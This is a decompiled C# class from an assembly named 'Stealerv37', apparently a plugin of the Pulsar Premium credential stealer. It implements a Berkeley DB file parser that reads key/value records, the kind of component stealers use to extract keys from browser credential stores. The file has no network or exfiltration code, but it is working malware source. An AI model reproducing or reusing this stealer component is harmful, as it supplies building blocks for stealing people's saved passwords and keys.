// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Sql.BerkeleyDB
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

#nullable disable
namespace Intelix.Helper.Sql;

public class BerkeleyDB
{
  public List<KeyValuePair<string, string>> Keys { get; }

  public BerkeleyDB(byte[] file)
  {
    List<byte> byteList = new List<byte>();
    this.Keys = new List<KeyValuePair<string, string>>();
    using (MemoryStream input = new MemoryStream(file))
    {
      using (BinaryReader binaryReader = new BinaryReader((Stream) input))
      {
        int num = 0;
        for (int length = (int) binaryReader.BaseStream.Length; num < length; ++num)
          byteList.Add(binaryReader.ReadByte());
      }
    }
    string str1 = BitConverter.ToString(BerkeleyDB.Extract(byteList.ToArray(), 0, 4, false)).Replace("-", "");
    int int32 = BitConverter.ToInt32(BerkeleyDB.Extract(byteList.ToArray(), 12, 4, true), 0);
    if (!str1.Equals("00061561"))
      return;
    int num1 = int.Parse(BitConverter.ToString(BerkeleyDB.Extract(byteList.ToArray(), 56, 4, false)).Replace("-", ""));
    int num2 = 1;
    while (this.Keys.Count < num1)
    {
      string[] array = new string[(num1 - this.Keys.Count) * 2];
      for (int index = 0; index < (num1 - this.Keys.Count) * 2; ++index)
        array[index] = BitConverter.ToString(BerkeleyDB.Extract(byteList.ToArray(), int32 * num2 + 2 + index * 2, 2, true)).Replace("-", "");
      Array.Sort<string>(array);
      for (int index = 0; index < array.Length; index += 2)
      {
        int start1 = Convert.ToInt32(array[index], 16 /*0x10*/) + int32 * num2;
        int start2 = Convert.ToInt32(array[index + 1], 16 /*0x10*/) + int32 * num2;
        int num3 = index + 2 >= array.Length ? int32 + int32 * num2 : Convert.ToInt32(array[index + 2], 16 /*0x10*/) + int32 * num2;
        string key = Encoding.ASCII.GetString(BerkeleyDB.Extract(byteList.ToArray(), start2, num3 - start2, false));
        string str2 = BitConverter.ToString(BerkeleyDB.Extract(byteList.ToArray(), start1, start2 - start1, false));
        if (!string.IsNullOrWhiteSpace(key))
          this.Keys.Add(new KeyValuePair<string, string>(key, str2));
      }
      ++num2;
    }
  }

  private static byte[] Extract(byte[] source, int start, int length, bool littleEndian)
  {
    byte[] numArray = new byte[length];
    int index1 = 0;
    for (int index2 = start; index2 < start + length; ++index2)
    {
      numArray[index1] = source[index2];
      ++index1;
    }
    if (littleEndian)
      Array.Reverse((Array) numArray);
    return numArray;
  }
}
